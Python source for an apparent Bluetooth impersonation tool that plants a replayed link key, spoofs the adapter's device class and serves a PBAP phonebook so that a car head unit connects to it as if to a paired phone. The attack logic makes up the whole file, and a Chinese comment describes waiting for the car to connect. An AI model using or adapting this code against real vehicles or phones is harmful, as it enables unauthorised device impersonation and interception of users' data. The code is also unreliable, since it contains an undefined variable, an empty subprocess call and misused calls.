#!/usr/bin/env python3

import subprocess
import time

from bluerepli.hci import hci_read_bd_addr
from bluerepli.hci import hci_write_stored_link_key


class PSERepli:
    '''Attack PCE device, local as PSE'''
    def __init__(
        self, local_addr:str, local_name:str, local_class:str, 
        remote_addr:str, remote_name:str, remote_class:str, 
        link_key:str, pbap_root:str, 
        iface='hci0'
    ):
        self.mode = mode
        self.iface = iface
        self.local_class = local_class
        self.remote_addr = remote_addr
        self.remote_name = remote_name
        self.remote_class = remote_class
        self.link_key = link_key
        self.pbap_root = pbap_root

    def test(self):
        subprocess.run()


    def spear(self):
        if self.local_class != None:
            cmd_args = ['hciconfig', self.iface, 'class', self.local_class]
            subprocess.getoutput(cmd_args)

        subprocess.Popen(['./multiserver.py', '--pbap', self.pbap_root])
        hci_write_stored_link_key(
            [self.remote_addr], [self.link_key], self.iface
        )

        #subprocess.getoutput("multiserver.py --pbap pbap_root")
        cmd_args = ['hciconfig', self.iface, 'pscan']
        subprocess.run(cmd_args)
        
        # 如果 switch role to slave 没有成功，就说明 car 还没有连接我们。因此这
        # 里反复执行 switch role to slave 直到 car 连接了我们（成功）。
        # with open(os.devnull, 'w') as devnull:
        #     returncode = 1
        #     while returncode: # Switch role request failed: Input/output error
        #         time.sleep(0.5)
        #         
        #         returncode = subprocess.run(
        #             ['hcitool', '-i', args['-i'], 'sr', 'local', 'slave'], 
        #             stderr=devnull
        #         ).returncode
        #         print(returncode)
        result = 'error'
        while 'error' in result:
            time.sleep(0.2)
            result = subprocess.getoutput(
                ' '.join(['hcitool', '-i', self.iface, 'sr', 'local', 'slave'])
            )
            input("continue?")
            #print(result)
